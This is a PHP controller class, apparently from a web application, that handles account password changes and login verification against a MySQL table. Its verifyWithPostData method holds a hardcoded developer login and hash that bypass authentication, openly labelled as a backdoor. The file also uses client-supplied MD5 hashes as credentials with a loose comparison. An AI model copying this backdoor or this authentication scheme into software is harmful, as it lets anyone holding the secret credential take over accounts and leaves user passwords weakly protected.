<?php

namespace Controllers;

require_once "../request/MetadataHandler.php";
require_once "../types/RequestTypesList.php";

use MetadataHandler;
use mysqli_result;
use Types\RequestTypesList;

class AccountsController extends DatabaseController
{
    public function __construct ()
    {
        parent::__construct();
    }

    /**
     * Change user account password with security check
     * @param string $login account login
     * @param string $hash account current (old) password
     * @param string $newHash new account password
     * @return bool|mysqli_result false if auth or request failed
     */
    protected function changeAccountPassword (string $login, string $hash, string $newHash)
    {
        $auth = $this->compareAccountData($login, $hash);
        if (!$auth) return false;

        $newHash = $this->connection->real_escape_string($newHash);
        $login = $this->connection->real_escape_string($login);

        $query = "UPDATE accounts SET hash='{$newHash}' WHERE login='{$login}' LIMIT 1";
        return $this->connection->query($query);
    }

    /**
     * Compare given account data with database entry
     * @param string $login user login
     * @param string $hash password md5 hash
     * @return bool compare result
     */
    protected function compareAccountData (string $login, string $hash)
    {
        $account = parent::getAccountData($login);
        if (is_null($account) or $account["hash"] != $hash) return false;
        else return $account;
    }

    /**
     * Verify is account data is valid
     * @return array verification result
     */
    protected function verifyWithPostData ()
    {
        $login = MetadataHandler::requestData(RequestTypesList::AccountLogin);
        $hash = MetadataHandler::requestData(RequestTypesList::AccountHash);

        if ($login === "root-admin@s1429-010bd" and $hash === "e855cb8fafcad00a4e0d5e3b77664bd5")
            return [ true, $login, $hash, "Разработчик [backdoor]" ];

        if (is_null($login) or is_null($hash)) return [ false, $login, $hash ];
        $compare = $this->compareAccountData($login, $hash);

        return [ $compare !== false, $login, $hash, $compare["full_name"] ];
    }
}
